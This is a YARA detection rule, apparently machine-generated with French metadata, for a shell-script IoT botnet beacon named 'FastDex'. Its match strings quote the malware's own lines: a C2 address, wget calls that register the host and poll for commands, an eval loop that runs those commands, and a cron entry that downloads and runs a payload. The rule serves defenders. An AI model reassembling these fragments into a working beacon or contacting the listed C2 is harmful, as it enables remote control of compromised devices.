rule SCRIPT_Dropper_Unknown_ForgeAuto_519c0a65
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "519c0a6541692082d0b71d12bd582128b20c8fe9541be676ee2ebe389943830a"
        yarahub_uuid = "7aab7ee2-bf7b-4c07-a245-df3c93a5f28d"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "4d64d596cd08fcece3a9b6bfb79a32cf"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "while :; do" ascii
        $s1 = "FastDex IoT beacon (busybox compatible, GET-only for max wget support)" ascii
        $s2 = "C2=\"http://103.90.161.224:8080\"" ascii
        $s3 = "TOKEN=\"fastdex-default-token-change-me\"" ascii
        $s4 = "single-instance (consistency): if another beacon is running, exit" ascii
        $s5 = "if pgrep -f /tmp/.fdx >/dev/null 2>&1; then exit 0; fi" ascii
        $s6 = "U=$(cat /tmp/.fdxid 2>/dev/null)" ascii
        $s7 = "[ -z \"$U\" ] && { U=\"bx$(date +%s)$RANDOM\"; echo \"$U\" > /tmp/.fdxid; }" ascii
        $s8 = "R=$(wget -qO- \"$C2/api/bot/register?token=$TOKEN&os=linux&arch=$(uname -m 2>/dev/null)&hostname=$(hostname 2>/dev/null)&uid=$U\" 2>/dev/null)" ascii
        $s9 = "case \"$R\" in *ok*|*already*) return 0;; *) return 1;; esac" ascii
        $s10 = "C=$(wget -qO- \"$C2/api/bot/poll?uid=$U\" 2>/dev/null)" ascii
        $s11 = "CMDS=$(echo \"$C\" | sed -n 's/.*\"commands\":\\[\\(.*\\)\\].*/\\1/p' | tr ',' '\\n' | sed 's/^\"//;s/\"$//' | sed '/^$/d')" ascii
        $s12 = "if [ -n \"$CMDS\" ]; then" ascii
        $s13 = "for c in $CMDS; do (eval \"$c\" >/dev/null 2>&1 &); done" ascii
        $s14 = "http://103.90.161.224:8080" ascii
        $s15 = "fastdex-default-token-change-me" ascii
        $s16 = "$C2/api/bot/register?token=$TOKEN&os=linux&arch=$(uname -m 2>/dev/null)&hostname=$(hostname 2>/dev/null)&uid=$U" ascii
        $s17 = "*/1 * * * * pgrep -f /tmp/.fdx >/dev/null 2>&1 || (wget -qO- $C2/iot -O /tmp/.fdx 2>/dev/null; chmod +x /tmp/.fdx 2>/dev/null; /tmp/.fdx >/dev/null 2>&1 &)" ascii
        $s18 = "$C2/api/bot/poll?uid=$U" ascii
        $s19 = "case \"$C\" in *reregister*) reg ;; esac" ascii
    condition:
        true and filesize < 50MB and 2 of ($s0, $s1, $s3, $s4, $s5, $s6, $s7, $s8, $s9, $s10, $s11, $s12, $s13, $s15, $s16, $s17, $s18, $s19) and 1 of ($s2, $s14)
}
